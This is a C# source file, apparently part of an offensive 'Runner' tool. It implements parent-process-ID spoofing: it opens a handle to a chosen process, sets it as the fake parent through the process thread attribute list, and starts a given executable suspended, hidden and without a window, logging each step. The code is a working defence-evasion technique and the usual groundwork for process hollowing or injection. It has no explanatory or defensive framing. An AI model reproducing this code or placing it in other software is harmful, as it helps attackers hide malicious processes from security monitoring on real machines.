using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;
using System.Threading;

namespace Runner
{

  class Parent
  {
    public Win32.PROCESS_INFORMATION Init(int parentID, string childPath)
    {
      // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
      const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
      const int STARTF_USESTDHANDLES = 0x00000100;
      const int STARTF_USESHOWWINDOW = 0x00000001;
      const ushort SW_HIDE = 0x0000;
      const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
      const uint CREATE_NO_WINDOW = 0x08000000;
      const uint CreateSuspended = 0x00000004;

      var pInfo = new Win32.PROCESS_INFORMATION();
      var siEx = new Win32.STARTUPINFOEX();

      IntPtr lpValueProc = IntPtr.Zero;
      IntPtr hSourceProcessHandle = IntPtr.Zero;
      var lpSize = IntPtr.Zero;

      Win32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
      siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
      Win32.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

      IntPtr parentHandle = Win32.OpenProcess((uint)Win32.ProcessAccessFlags.CreateProcess | (uint)Win32.ProcessAccessFlags.DuplicateHandle, false, (uint)parentID);
      Console.WriteLine($"[>] Handle {parentHandle} opened for parent process id.");

      lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
      Marshal.WriteIntPtr(lpValueProc, parentHandle);

      Win32.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
      Console.WriteLine($"[>] Adding attributes to a list.");

      siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
      siEx.StartupInfo.wShowWindow = SW_HIDE;

      var ps = new Win32.SECURITY_ATTRIBUTES();
      var ts = new Win32.SECURITY_ATTRIBUTES();
      ps.nLength = Marshal.SizeOf(ps);
      ts.nLength = Marshal.SizeOf(ts);

      try {
        bool ProcCreate = Win32.CreateProcess(childPath, null, ref ps, ref ts, true, CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
        if (!ProcCreate) {
          Console.WriteLine($"[!] Proccess failed to execute!");
          throw new System.Exception("Process parent failed to start");
        }
        Console.WriteLine($"[>] Parent PID: {pInfo.dwProcessId} suspended.");
      } catch (Exception ex) {
        Console.WriteLine("[!] " + Marshal.GetExceptionCode());
        Console.WriteLine(ex.Message);
        throw ex;
      }
      return pInfo;
    }
  }
}